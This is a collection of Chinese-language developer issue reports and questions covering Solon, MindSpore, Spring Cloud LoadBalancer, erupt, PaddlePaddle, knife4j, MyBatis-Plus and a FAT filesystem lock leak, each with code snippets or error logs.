具体业务controller implements 接口不继承上面的get post mapping方法（附解决方案）,"先上结构，如图   <code>: &lt;parent&gt; &lt;groupId&gt;org.noear&lt;/groupId&gt; &lt;artifactId&gt;solon-parent&lt;/artifactId&gt; &lt;version&gt;1.10.10-M3&lt;/version&gt; &lt;relativePath /&gt; &lt;/parent&gt; import cn.hutool.core.util.ObjectUtil; import org.noear.solon.Utils; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.core.BeanWrap; import org.noear.solon.core.handle.Action; import org.noear.solon.core.handle.HandlerLoader; import org.noear.solon.core.handle.HandlerSlots; import org.noear.solon.core.handle.MethodType; import org.noear.solon.core.handle.MethodTypeUtil; import org.noear.solon.core.util.PathUtil; import java.lang.reflect.Method; import java.util.Arrays; import java.util.HashMap; import java.util.HashSet; import java.util.Map; import java.util.Set; public class HandlerLoaderPlus extends HandlerLoader { public HandlerLoaderPlus(BeanWrap wrap) { super(wrap); } @Override protected Method[] findMethods(Class&lt;?&gt; clz) { return clz.getMethods(); } @Override protected void loadActionDo(HandlerSlots slots, boolean all) { String m_path; if (bPath == null) { bPath = """"; } Set&lt;MethodType&gt; b_method = new HashSet&lt;&gt;(); loadControllerAide(b_method); Set&lt;MethodType&gt; m_method; Mapping m_map; int m_index = 0; Map&lt;String, Mapping&gt; interfaceMethodMap = new HashMap&lt;&gt;(); Class&lt;?&gt;[] interfaces = bw.clz().getInterfaces(); if (ObjectUtil.isNotNull(interfaces) &amp;&amp; interfaces.length &gt; 0) { for (Class&lt;?&gt; anInterface : interfaces) { Controller annotation = anInterface.getAnnotation(Controller.class); if (annotation != null) { Method[] methods = anInterface.getMethods(); for (Method method : methods) { String name = method.getName(); Mapping mappingAnnotation = method.getAnnotation(Mapping.class); if (mappingAnnotation != null) { interfaceMethodMap.put(name, mappingAnnotation); } } } } } //只支持 public 函数为 Action for (Method method : findMethods(bw.clz())) { m_map = method.getAnnotation(Mapping.class); if (m_map == null &amp;&amp; !interfaceMethodMap.isEmpty()) { m_map = interfaceMethodMap.get(method.getName()); } m_index = 0; m_method = new HashSet&lt;&gt;(); //获取 action 的methodTypes MethodTypeUtil.findAndFill(m_method, t -&gt; method.getAnnotation(t) != null); //构建path and method if (m_map != null) { m_path = Utils.annoAlias(m_map.value(), m_map.path()); if (m_method.size() == 0) { //如果没有找到，则用Mapping上自带的 m_method.addAll(Arrays.asList(m_map.method())); } m_index = m_map.index(); } else { m_path = method.getName(); if (m_method.size() == 0) { //获取 controller 的methodTypes MethodTypeUtil.findAndFill(m_method, t -&gt; bw.clz().getAnnotation(t) != null); } if (m_method.size() == 0) { //如果没有找到，则用Mapping上自带的；或默认 if (bMapping == null) { m_method.add(MethodType.HTTP); } else { m_method.addAll(Arrays.asList(bMapping.method())); } } } //如果是service，method 就不需要map if (m_map != null || all) { String newPath = PathUtil.mergePath(bPath, m_path); Action action = createAction(bw, method, m_map, newPath, bRemoting); //m_method 必须之前已准备好，不再动 //用于支持 Cors loadActionAide(method, action, m_method); if (b_method.size() &gt; 0 &amp;&amp; m_method.contains(MethodType.HTTP) == false &amp;&amp; m_method.contains(MethodType.ALL) == false) { //用于支持 Cors m_method.addAll(b_method); } for (MethodType m1 : m_method) { if (m_map == null) { slots.add(newPath, m1, action); } else { if ((m_map.after() || m_map.before())) { if (m_map.after()) { slots.after(newPath, m1, m_index, action); } else { slots.before(newPath, m1, m_index, action); } } else { slots.add(newPath, m1, action); } } } } } } } public static void main(String[] args) { Solon.start(WebApp.class, args, solonApp -&gt; { // 自动扫描父类接口 Solon.context().beanBuilderAdd(Controller.class, (clz, bw, anno) -&gt; { new HandlerLoaderPlus(bw).load(Solon.app()); }); }); }"
MindSpore Lite无法写入输入数据,"MindSpore Lite 无法写入输入数据 版本：MindSpore Lite 1.6.1 X86_64 模型为ms格式，通过converter工具转换onnx模型得到，使用netron查看ms模型input_shape和output_shape皆为动态的。 代码片段如下： 用和都不可以写入数据，导致推理出来的结果有问题。   <code>: std::vector&lt;mindspore::MSTensor&gt; inputs_; inputs_.clear(); std::ifstream ifs(in_file_); if (!ifs.is_open() || !ifs.good()) { std::cout &lt;&lt; ""failed to load image, check image path"" &lt;&lt; std::endl; return -1; } ifs.seekg(0, std::ios::end); size_t size = ifs.tellg(); mindspore::MSTensor image(""image_in"", mindspore::DataType::kNumberTypeUInt8, {static_cast&lt;int64_t&gt;(size)}, nullptr, 0); ifs.seekg(0, std::ios::beg); ifs.read(reinterpret_cast&lt;char *&gt;(image.MutableData()), size); ifs.close(); auto decode_op = Decode(); auto executor_0 = Execute(decode_op); executor_0(image, &amp;image); height_ = image.Shape()[0]; width_ = image.Shape()[1]; channel_ = image.Shape()[2]; std::cout &lt;&lt; ""original image h: "" &lt;&lt; height_ &lt;&lt; "", w: "" &lt;&lt; width_ &lt;&lt; "", c: "" &lt;&lt; channel_ &lt;&lt; std::endl; infer_height_ = GetResizeShape(height_); infer_width_ = GetResizeShape(width_); auto resize_op = Resize({infer_height_, infer_width_}); auto normalize_op = Normalize({127.5, 127.5, 127.5}, {127.5, 127.5, 127.5}); auto executor = Execute({resize_op, normalize_op}); executor(image, &amp;image); std::cout &lt;&lt; ""read image over, data size: "" &lt;&lt; image.DataSize() &lt;&lt; std::endl; std::cout &lt;&lt; ""image h: "" &lt;&lt; image.Shape()[0] &lt;&lt; "", w: "" &lt;&lt; image.Shape()[1] &lt;&lt; "", c: "" &lt;&lt; image.Shape()[2] &lt;&lt; std::endl; std::cout &lt;&lt; ""image datatype: "" &lt;&lt; int(image.DataType()) &lt;&lt; std::endl; inputs_.emplace_back(mindspore::MSTensor(""generator_input:0"", DataType::kNumberTypeFloat32, {1, infer_height_, infer_width_, 3}, image.Data().get(), image.DataSize())); std::cout &lt;&lt; ""input image over"" &lt;&lt; std::endl; auto img_tensor = inputs_[0]; auto img_data = img_tensor.MutableData(); if (img_data == nullptr) { std::cout &lt;&lt; ""processed image data get error"" &lt;&lt; std::endl; } float* img_values = reinterpret_cast&lt;float *&gt;(img_data); std::cout &lt;&lt; ""====== Show processed image data ======"" &lt;&lt; std::endl; for (int i = 0; i &lt; infer_height_; ++i) { for (int j = 0; j &lt; infer_width_; ++j) { float r = *img_values; ++img_values; float g = *img_values; ++img_values; float b = *img_values; ++img_values; std::cout &lt;&lt; r &lt;&lt; "", "" &lt;&lt; g &lt;&lt; "", "" &lt;&lt; b &lt;&lt; std::endl; } } auto inputs = model_-&gt;GetInputs(); if (inputs.size() &lt; 1) { std::cerr &lt;&lt; ""error code for inputs size!"" &lt;&lt; std::endl; return -1; } // Inputs info std::cout &lt;&lt; ""show inputs info before resize"" &lt;&lt; std::endl; for (int i = 0; i &lt; inputs.size(); ++i) { auto tensor = inputs[i]; std::cout &lt;&lt; ""tensor name: "" &lt;&lt; tensor.Name() &lt;&lt; "", type: "" &lt;&lt; int(tensor.DataType()) &lt;&lt; "", size: "" &lt;&lt; tensor.ElementNum() &lt;&lt; "", data_size: "" &lt;&lt; tensor.DataSize(); std::cout &lt;&lt; "", shape: {""; auto shape = tensor.Shape(); for (int j = 0; j &lt; shape.size(); ++j) { std::cout &lt;&lt; shape[j] &lt;&lt; "",""; } std::cout &lt;&lt; ""}"" &lt;&lt; std::endl; } // reshape std::vector&lt;int64_t&gt; resize_shape = {1, infer_height_, infer_width_, 3}; std::vector&lt;std::vector&lt;int64_t&gt;&gt; new_shapes; new_shapes.push_back(resize_shape); auto resize_ret = model_-&gt;Resize(inputs, new_shapes); if (resize_ret != mindspore::kSuccess) { delete model_; std::cerr &lt;&lt; ""Resize input tensor shape error."" &lt;&lt; resize_ret &lt;&lt; std::endl; return -1; } // Inputs info std::cout &lt;&lt; ""show inputs info after resize"" &lt;&lt; std::endl; for (int i = 0; i &lt; inputs.size(); ++i) { auto tensor = inputs[i]; std::cout &lt;&lt; ""tensor name: "" &lt;&lt; tensor.Name() &lt;&lt; "", type: "" &lt;&lt; int(tensor.DataType()) &lt;&lt; "", size: "" &lt;&lt; tensor.ElementNum() &lt;&lt; "", data_size: "" &lt;&lt; tensor.DataSize(); std::cout &lt;&lt; "", shape: {""; auto shape = tensor.Shape(); for (int j = 0; j &lt; shape.size(); ++j) { std::cout &lt;&lt; shape[j] &lt;&lt; "",""; } std::cout &lt;&lt; ""}"" &lt;&lt; std::endl; } // inputs[0] = inputs_[0]; // input array auto in_tensor = inputs[0]; auto in_data = in_tensor.MutableData(); if (in_data == nullptr) { std::cerr &lt;&lt; ""MallocData for InputTensor 0 failed."" &lt;&lt; std::endl; return -1; } float* in_values = reinterpret_cast&lt;float *&gt;(in_data); // feed data auto img_tensor = inputs_[0]; auto img_data = img_tensor.MutableData(); if (img_data == nullptr) { std::cout &lt;&lt; ""processed image data get error"" &lt;&lt; std::endl; } // 写入方法一 memcpy(in_data, img_data, img_tensor.DataSize()); // 写入方法二 // float* img_values = reinterpret_cast&lt;float *&gt;(img_data); // int num_limit = infer_height_ * infer_width_ * 3 - 1; // for (int i = 0; i &lt; num_limit; ++i) { // *in_values = *img_values; // ++in_values; // ++img_values; // } // last data // *in_values = *img_values; // show data auto in_check_tensor = inputs[0]; auto in_check_data = in_check_tensor.MutableData(); if (in_check_data == nullptr) { std::cerr &lt;&lt; ""MallocData for InputTensor 0 failed."" &lt;&lt; std::endl; return -1; } float* in_check_values = reinterpret_cast&lt;float *&gt;(in_check_data); std::cout &lt;&lt; ""====== Show input data ======"" &lt;&lt; std::endl; for (int i = 0; i &lt; infer_height_; ++i) { for (int j = 0; j &lt; infer_width_; ++j) { float r = *in_check_values; ++in_check_values; float g = *in_check_values; ++in_check_values; float b = *in_check_values; ++in_check_values; std::cout &lt;&lt; r &lt;&lt; "", "" &lt;&lt; g &lt;&lt; "", "" &lt;&lt; b &lt;&lt; std::endl; } } 写入方法一 写入方法二"
GatewayApplication 入口类上的配置注解无效,"我正在尝试使用 LoadBalancer 进行灰度发布配置。希望能够实现利用 spring.cloud.nacos.discovery.metadata.version 参数控制流量的方向的效果。一切都按照 LoadBalancer 官方文档进行操作，但是最后发现没法实现应有的效果。下面是一些相关类的代码： 以上代码应该没有问题，且经过初步排查，我发现是 @LoadBalancerClients(defaultConfiguration = {VersionLoadBalancerBean.class}) 该注解并未生效，VersionLoadBalancerBean 该类中的 Bean 并未被成功加载。请问是否能够看出是什么问题呢？   <code>: @Configuration @Slf4j @LoadBalancerClients(defaultConfiguration = {VersionLoadBalancerBean.class}) public class VersionLoadBalancerConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } } public class VersionLoadBalancerBean { @Bean ReactorLoadBalancer&lt;ServiceInstance&gt; randomLoadBalancer(Environment environment, LoadBalancerClientFactory loadBalancerClientFactory) { String name = environment.getProperty(LoadBalancerClientFactory.PROPERTY_NAME); return new VersionGrayLoadBalancer(loadBalancerClientFactory .getLazyProvider(name, ServiceInstanceListSupplier.class), name); } } @Log4j2 public class VersionGrayLoadBalancer implements ReactorServiceInstanceLoadBalancer { private final ObjectProvider&lt;ServiceInstanceListSupplier&gt; serviceInstanceListSupplierProvider; private final String serviceId; private final AtomicInteger position; public VersionGrayLoadBalancer(ObjectProvider&lt;ServiceInstanceListSupplier&gt; serviceInstanceListSupplierProvider, String serviceId) { this(serviceInstanceListSupplierProvider,serviceId,new Random().nextInt(1000)); } public VersionGrayLoadBalancer(ObjectProvider&lt;ServiceInstanceListSupplier&gt; serviceInstanceListSupplierProvider, String serviceId, int seedPosition) { this.serviceId = serviceId; this.serviceInstanceListSupplierProvider = serviceInstanceListSupplierProvider; this.position = new AtomicInteger(seedPosition); } @Override public Mono&lt;Response&lt;ServiceInstance&gt;&gt; choose(Request request) { ServiceInstanceListSupplier supplier = this.serviceInstanceListSupplierProvider.getIfAvailable( NoopServiceInstanceListSupplier::new); return supplier.get(request).next() .map(serviceInstances -&gt; processInstanceResponse(serviceInstances,request)); } private Response&lt;ServiceInstance&gt; processInstanceResponse(List&lt;ServiceInstance&gt; instances, Request request) { if (instances.isEmpty()) { log.warn(""No servers available for service: "" + this.serviceId); return new EmptyResponse(); } else { DefaultRequestContext requestContext = (DefaultRequestContext) request.getContext(); RequestData clientRequest = (RequestData) requestContext.getClientRequest(); HttpHeaders headers = clientRequest.getHeaders(); // get Request Header String reqVersion = headers.getFirst(""version""); if(StringUtils.isEmpty(reqVersion)){ return processRibbonInstanceResponse(instances); } log.info(""request header version : {}"",reqVersion ); // filter service instances List&lt;ServiceInstance&gt; serviceInstances = instances.stream() .filter(instance -&gt; reqVersion.equals(instance.getMetadata().get(""version""))) .collect(Collectors.toList()); if(serviceInstances.size() &gt; 0){ return processRibbonInstanceResponse(serviceInstances); }else{ return processRibbonInstanceResponse(instances); } } } /** * 负载均衡器 * 参考 org.springframework.cloud.loadbalancer.core.RoundRobinLoadBalancer#getInstanceResponse * @author javadaily */ private Response&lt;ServiceInstance&gt; processRibbonInstanceResponse(List&lt;ServiceInstance&gt; instances) { int pos = Math.abs(this.position.incrementAndGet()); ServiceInstance instance = instances.get(pos % instances.size()); return new DefaultResponse(instance); } }"
饼图右侧的图例文字内容是怎么设置的？,"按照数据 右侧图例文字： 一班 50 人 。这个 ”人“ 字哪来的 ？是什么操作   <code>: ""chartData"": { ""series"": [{ ""name"": ""一班"", ""data"": 50 }, { ""name"": ""二班"", ""data"": 30 }, { ""name"": ""三班"", ""data"": 20 }, { ""name"": ""四班"", ""data"": 18 }, { ""name"": ""五班"", ""data"": 8 }] }"
[ST][MS/modelzoo][NET][fasterrcnn][GPU] RuntimeError: robin_hood::map overflow,"问题commitid：4da27779 训练失败 / 硬件环境: /device GPU/ (/): /mode graph : -- MindSpore version :master commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_fasterrcnn_gpu_check_loss_8p get code from models sh run_train.sh 训练成功 备注 提给贺炜   <code>: [WARNING] ME(31236:140330479376192,MainProcess):2022-08-19-09:50:10.564.548 [mindspore/train/model.py:1078] For LossCallBack callback, {'step_end'} methods may not be supported in later version, Use methods prefixed with 'on_train' or 'on_eval' instead when using customized callbacks. [CRITICAL] ME(31233:140047741675328,MainProcess):2022-08-19-09:50:40.130.111 [mindspore/dataset/engine/datasets.py:2904] Uncaught exception: Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/fasterrcnn/train/test_ms_fasterrcnn_gpu_train_check_loss_8p_0005/scripts/../train.py"", line 255, in &lt;module&gt; train_fasterrcnn() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/fasterrcnn/train/test_ms_fasterrcnn_gpu_train_check_loss_8p_0005/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/fasterrcnn/train/test_ms_fasterrcnn_gpu_train_check_loss_8p_0005/scripts/../train.py"", line 228, in train_fasterrcnn model.train(config.epoch_size, dataset, callbacks=cb, sink_size=100) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 574, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 961, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 933, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1116, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: robin_hood::map overflow"
[CT][MS]for-break bug,"GPU -- MindSpore version : vm+graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: context.set_context(mode=context.GRAPH_MODE, device_target=""GPU"", save_graphs=True) class SimpleNet(nn.Cell): def __init__(self, shape): super(SimpleNet,self).__init__() self.max_cycles = 5 self.reduce_sum = P.ReduceSum() self.epsilon = 1e-7 self.gamma = Parameter(Tensor(np.ones(1)*2, ms.float32), name=""gamma"") #权值gamma初始化 self.ones = Tensor(np.ones((32, 9)), ms.float32) def construct(self,x): for cycle in range(self.max_cycles): x = x * self.gamma if self.reduce_sum(x)&gt;self.max_cycles: break return x class TestClass(nn.Cell): def __init__(self, shape): super(TestClass, self).__init__() self.network = SimpleNet(shape) def construct(self, x): x = self.network(x) return x*x class GradCell(nn.Cell): def __init__(self, network, sens=1.0): super(GradCell, self).__init__(auto_prefix=False) self.network = network self.grad = C.GradOperation() def construct(self, *inputs): #loss = self.network(*inputs) grads = self.grad(self.network)(*inputs) return grads x_test = np.array([1.5]) x = Tensor(x_test, ms.float32) net = TestClass(x_test.shape) test_fun = GradCell(net) output = test_fun(x) print(output)"
关于@Edit  下拉框自动选中问题,"JDK版本： openjdk_8_201 erupt版本： 1.6.15 作者辛苦了，提个优化问题 search = @Search, // 这个代码必须要存在，否则详情页中，这个下拉框不会自动选中。理论上应是可以不用加这个代码，下拉框默认可选中数据库已存在的值。还有一个下拉框弹窗选择的时候，没有把已存在的数据自动选中。   <code>: @EruptField( views = @View(title = ""动态模板"", desc = ""动态模板可插入变量，变量{}""), edit = @Edit(title = ""动态模板"", desc = ""动态模板可插入变量，变量{}"", search = @Search, // 这个地方必须要存在，否则详情页中，这个下拉框不会自动选中 notNull = true, type = EditType.CHOICE, choiceType = @ChoiceType(vl = { @VL(value = ""1"", label = ""动态""), @VL(value = ""0"", label = ""非动态"") })) ) private Integer isDynamic;"
paddle cloud 计划内容,第一阶段： 可以演示，可以开放给部分用户使用(内测) 时间点：2017-05-31 ? 命令行 paddle upload/download 不允许用户在分布式训练里画图，只能打印log。 Paddle会提供cost的动态图表。 Parameter Server是否需要重写需要更多调研。 PR问题达成了一致。 分工（请参考issue评论，4/24/2017的plan）   <code>: train
微服务部署到Linux环境，运行一段时间就宕机,"环境信息 pigx版本: 4.4 是否修改包名: 是 提供详细 微服务部署到Linux环境，出现报错异常，就宕机java进程结束，具体日志如下： 请教怎么解决这个问题，谢谢   <code>: Caused by: java.sql.SQLException: Field 'signature' doesn't have a default value at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:129) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122) at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:916) at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:354) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3461) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3459) at com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440) at com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:3459) at com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:167) at com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:497) at sun.reflect.GeneratedMethodAccessor258.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59) at com.sun.proxy.$Proxy319.execute(Unknown Source) at org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:47) at org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:74) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy317.update(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:50) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:76) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Invocation.proceed(Invocation.java:49) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:106) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy314.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:194) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:181) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 133 common frames omitted 2022-09-20 17:08:03,099 [SpringApplicationShutdownHook] ERROR [com.alibaba.cloud.nacos.discovery.NacosWatch] NacosWatch.java:180 - namingService unsubscribe failed, properties:NacosDiscoveryProperties{serverAddr='xxx-register:8848', username='', password='', endpoint='', namespace='', watchDelay=30000, logName='', service='xxx-platform-biz', weight=1.0, clusterName='DEFAULT', group='DEFAULT_GROUP', namingLoadCacheAtStart='false', metadata={preserved.register.source=SPRING_CLOUD}, registerEnabled=true, ip='192.168.124.216', networkInterface='', port=22003, secure=false, accessKey='', secretKey='', heartBeatInterval=null, heartBeatTimeout=null, ipDeleteTimeout=null, instanceEnabled=true, ephemeral=true, failureToleranceEnabled=false}, ipDeleteTimeout=null, failFast=true} java.lang.IllegalStateException: UT015023: This Context has been already destroyed at io.undertow.servlet.spec.ServletContextImpl.getDeploymentInfo(ServletContextImpl.java:211) at io.undertow.servlet.spec.ServletContextImpl.getInitParameterNames(ServletContextImpl.java:449) at org.springframework.web.context.support.ServletContextPropertySource.getPropertyNames(ServletContextPropertySource.java:41) at com.ulisesbocchio.jasyptspringboot.wrapper.EncryptableEnumerablePropertySourceWrapper.getPropertyNames(EncryptableEnumerablePropertySourceWrapper.java:34) at com.alibaba.spring.util.PropertySourcesUtils.getPropertyNames(PropertySourcesUtils.java:130)"
用python api预测时打不打开mkldnn，预测耗时相同。,"1）PaddlePaddle版本：1.5.2 2）CPU：intel(R) Core(TM) i5-7500 3）系统环境：win10，Python版本 3.7.4 问题描述：transformer做seq2seq模型预测时，使用python api，配置AnalysisConfig时添不添加 预测时间相同，预测时间均为1.5秒左右。 我没有手动安装过mkldnn，也没重新编译过源码，请问直接pip install paddlepaddle是否已经集成安装mkldnn了吗？还是需要手动安装mkldnn？或者是哪里没配置好？ 下面贴出部分代码：   <code>: config.disable_gpu() config.enable_mkldnn() law_scope = fluid.core.Scope() with fluid.scope_guard(law_scope): prog_file = ""{}/model.pdmodel"".format(args.model_path) params_file = ""{}/params.pdparams"".format(args.model_path) config = AnalysisConfig(prog_file, params_file) if use_cuda: config.enable_use_gpu(2000, 0) else: config.disable_gpu() config.enable_mkldnn() global predictor_law predictor_law = create_paddle_predictor(config)"
动态图如何设置random seed,在静态图中，可以通过program设定random_seed 动态图里没有program的概念，如何固定random seed呢？   <code>: program.random_seed = 1
[3.0.2]忽略参数显示，有办法统一忽略某个基类下的参数吗,"我想问下有统一忽略某个基类的里的参数吗，如上面每个请求都会继承AbstractRequest 这个基类，而这个基类中的参数不需要当前请求来赋值，所以显示在文档中比较多余。。   <code>: public abstract class AbstractRequest extends PrintFriendliness { private String appId; private String requestId; } public class CheckRiskWordRequest extends AbstractRequest { @ApiModelProperty(value = ""检测的文本内容"",required = true) private String word; } public class TestController { @ApiOperation(value = ""校验文字"") @ApiOperationSupport(ignoreParameters = {""appId"",""requestId""}) @PostMapping(""/riskWord/check"") public BaseResponse&lt;CheckRiskWordResponse&gt; checkRiskWord(@RequestBody CheckRiskWordRequest req) { return riskCheckFacade.checkRiskWord(req); } }"
【众智】【计算-GPU开发】Sinc,Sinc 计算sinc函数。 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x y 对应底层算子 对应底层算子Sinc Classify Name Type TypeRange Required Doc AttrDefault INPUT x BasicType TRUE OUTPUT y BasicType TRUE PyTorch1.8.1接口： torch.sinc https://pytorch.org/docs/1.8.1/generated/torch.sinc.html 3. 异常处理 4. 算子反向 参考torch/csrc/autograd/generated/Functions.cpp SincBackward()   <code>: class Sinc(Primitive):
飞桨2.0rc高级API在使用model.fit的时候，准确率acc显示不正确,"1）PaddlePaddle版本：2.0rc 2）CPU：i5 6600k 3）GPU：GTX 1660 super CUDA10.2 4）系统环境：windows10, ubuntu18.04 训练信息 1）单机 2）显存 6G 复现信息： 输出 问题描述： 在使用resnet18训练cifar10分类的过程中，发现fit过程中，输出的acc一直是10%左右（不正常），在最后验证的时候，acc显示67% （正常）。出问题的原因在于batch_size, 当batch_size不等于1的时候 ，acc显示不正常； 当batch_size=1的时候，acc现在正常。 通过上面的代码可以复现问题，已经有同学也发现了这个问题。   <code>: import paddle print(paddle.__version__) train_dataset = paddle.vision.datasets.Cifar10(mode='train') val_dataset = paddle.vision.datasets.Cifar10(mode='test') mnist = paddle.vision.models.resnet18(num_classes=10) # 预计模型结构生成模型实例，便于进行后续的配置、训练和验证 model = paddle.Model(mnist) # 模型训练相关配置，准备损失计算方法，优化器和精度计算方法 model.prepare(paddle.optimizer.Adam(parameters=mnist.parameters()), paddle.nn.CrossEntropyLoss(), paddle.metric.Accuracy()) # 开始模型训练 model.fit(train_dataset, epochs=5, batch_size=128, verbose=1 ) print(model.evaluate(val_dataset,batch_size=1, verbose=1)) 2.0.0-rc0 W1117 13:59:02.444118 9196 device_context.cc:338] Please NOTE: device: 0, CUDA Capability: 75, Driver API Version: 10.2, Runtime API Version: 10.2 W1117 13:59:02.722856 9196 device_context.cc:346] device: 0, cuDNN Version: 7.6. Epoch 1/5 D:\Anaconda3\anaconda\lib\site-packages\paddle\fluid\layers\utils.py:77: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated, and in 3.8 it will stop working return (isinstance(seq, collections.Sequence) and D:\Anaconda3\anaconda\lib\site-packages\paddle\nn\layer\norm.py:637: UserWarning: When training, we now always track global mean and variance. ""When training, we now always track global mean and variance."") step 391/391 [==============================] - loss: 1.2710 - acc: 0.1015 - 52ms/step Epoch 2/5 step 391/391 [==============================] - loss: 0.9901 - acc: 0.1022 - 53ms/step Epoch 3/5 step 391/391 [==============================] - loss: 1.0232 - acc: 0.1033 - 51ms/step Epoch 4/5 step 391/391 [==============================] - loss: 0.7586 - acc: 0.1037 - 53ms/step Epoch 5/5 step 391/391 [==============================] - loss: 0.5976 - acc: 0.1037 - 51ms/step Eval begin... step 10000/10000 [==============================] - loss: 0.0107 - acc: 0.6796 - 11ms/step Eval samples: 10000 {'loss': [0.010651758], 'acc': 0.6796}"
format函数错误分支未释放锁,"format函数送入错误的簇大小 可能导致死锁   <code>: int format(const char *dev, int sectors, int option) { struct Vnode *device = NULL; INT err; /* ... */ VnodeHold(); err = VnodeLookup(dev, &amp;device, 0); if (err == -ENOENT || err == -ENOSYS) { VnodeDrop(); set_errno(ENODEV); return -1; } else if (err &lt; 0) { VnodeDrop(); set_errno(-err); return -1; } err = fatfs_mkfs(device, sectors, option); if (err &lt; 0) { /* 如果进入这个分支，会导致Vnode锁未释放 */ set_errno(-err); return -1; } #ifdef LOSCFG_FS_FAT_VIRTUAL_PARTITION else if (err &gt;= VIRERR_BASE) { set_errno(err); } #endif VnodeDrop(); return 0; }"
Entity中使用@Transient，查询报错，好像Mybatis-Plus未识别这个标注。,"SQL: SELECT id,,name_en AS nameEn,app_id AS appId,parent_id AS parentId,url,icon,order_number AS orderNumber,auth_id AS authId,,description,created_by AS createdBy,created_at AS createdAt,updated_by AS updatedBy,updated_at AS updatedAt,children FROM framework.menus WHERE (app_id = 12) Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column 'children' in 'field list' ; bad SQL grammar []; nested exception is com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column 'children' in 'field list'] with root cause com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column 'children' in 'field list' at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:408)   <code>: name status"
